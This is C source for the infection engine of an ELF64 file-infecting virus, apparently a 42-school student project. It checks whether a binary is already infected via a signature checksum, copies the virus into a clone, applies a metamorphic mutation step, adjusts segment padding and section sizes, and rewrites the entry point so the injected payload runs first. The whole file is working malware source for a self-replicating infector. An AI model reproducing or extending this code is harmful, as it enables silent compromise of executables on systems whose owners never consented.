/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection_engine.c                                 :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
/*   Updated: 2021/06/15 20:08:00 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "accessors.h"
#include "compiler_utils.h"
#include "errors.h"
#include "loader.h"
#include "utils.h"
#include "virus.h"

/*
** if current binary is already our client, don't infect again ! <3
*/

static bool	not_infected(const struct entry *original_entry, \
			struct safe_ptr ref)
{
	const Elf64_Off	sh_offset        = original_entry->safe_shdr->sh_offset;
	const size_t	entry_offset     = sh_offset + original_entry->offset_in_section;
	const size_t	dist_entry_header = (size_t)virus_header_struct - (size_t)loader_entry;
	const size_t	signature_offset = entry_offset + dist_entry_header + sizeof(struct virus_header);
	char	 	*signature       = safe(ref, signature_offset, SIGNATURE_LEN);

	if (!signature) return errors(ERR_VIRUS, _ERR_ALREADY_INFECTED);

	if (checksum(signature, SIGNATURE_LEN) == SIGNATURE_CKSUM)
		return errors(ERR_VIRUS, _ERR_ALREADY_INFECTED);

	return true;
}

static bool	change_entry(struct safe_ptr ref, const struct entry *original_entry)
{
	Elf64_Ehdr	*clone_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));

	if (!clone_hdr)  return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);

	const Elf64_Xword	sh_offset         = original_entry->safe_shdr->sh_offset;
	const size_t		offset_in_section = original_entry->offset_in_section;
	const size_t		entry_off         = sh_offset + offset_in_section;
	const size_t		payload_offset    = original_entry->end_of_last_section;
	const Elf64_Xword	payload_distance  = payload_offset - entry_off;

	Elf64_Addr		e_entry = clone_hdr->e_entry;

	e_entry += payload_distance;
	clone_hdr->e_entry = e_entry;

	return true;
}

static bool	adjust_sizes(struct entry *clone_entry, size_t shift_amount, size_t virus_size)
{
	clone_entry->safe_last_section_shdr->sh_size += virus_size;
	clone_entry->safe_phdr->p_filesz             += shift_amount;
	clone_entry->safe_phdr->p_memsz              += shift_amount;

	return true;
}

static bool	define_shift_amount(const struct entry *original_entry,
			size_t *shift_amount, size_t virus_size)
{
	const size_t	p_filesz        = original_entry->safe_phdr->p_filesz;
	const size_t	p_offset        = original_entry->safe_phdr->p_offset;
	const size_t	segment_end     = p_offset + p_filesz;
	const size_t	segment_padding = segment_end - original_entry->end_of_last_section;

	if (virus_size < segment_padding)
	{
		*shift_amount = 0;
		return true;
	}

	const size_t	p_memsz = original_entry->safe_phdr->p_memsz;
	const size_t	p_align = original_entry->safe_phdr->p_align;

	*shift_amount = ALIGN(virus_size, PAGE_ALIGNMENT);

	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;

	if (end_padding > p_align)
		return errors(ERR_VIRUS, _ERR_NOT_ENOUGH_PADDING);

	return true;
}

bool		infection_engine(struct virus_header *vhdr, struct safe_ptr clone_ref, struct safe_ptr original_ref)
{
	struct entry	clone_entry;
	struct entry	original_entry;
	const size_t	*loader_off = &original_entry.end_of_last_section;
	size_t		shift_amount     = 0;                                   // changed by <define_shift_amount>
	// int		virus_func_shift = 0;                                   // changed by <metamorph_self>
	uint64_t	seed       = vhdr->seed;                                // changed by <generate_seed>
	size_t		virus_size = vhdr->virus_size;                          // changed by <metamorph_self>

	if (!find_entry(&mut original_entry, original_ref)
	|| !not_infected(&original_entry, original_ref)
	|| !copy_virus_to_clone(clone_ref, &original_entry, vhdr)
	// || !generate_seed(&seed, clone_ref)
	// || !metamorph_self(clone_ref, &virus_size, &virus_func_shift, *loader_off, seed)
	|| !metamorph_self(clone_ref, &virus_size, *loader_off, seed)
	// || !adapt_virus_call_in_loader(clone_ref, *loader_off, virus_func_shift)
	|| !define_shift_amount(&original_entry, &mut shift_amount, virus_size)
	|| !copy_client_to_clone(clone_ref, original_ref, *loader_off, shift_amount, original_ref.size)
	|| !adjust_references(clone_ref, shift_amount, *loader_off)
	|| !find_entry(&mut clone_entry, clone_ref)
	|| !adjust_sizes(&mut clone_entry, shift_amount, virus_size)
	|| !setup_virus_header(clone_ref, *loader_off, virus_size, seed)
	|| !change_entry(clone_ref, &original_entry))
		return errors(ERR_THROW, _ERR_INFECTION_ENGINE);

	return true;
}
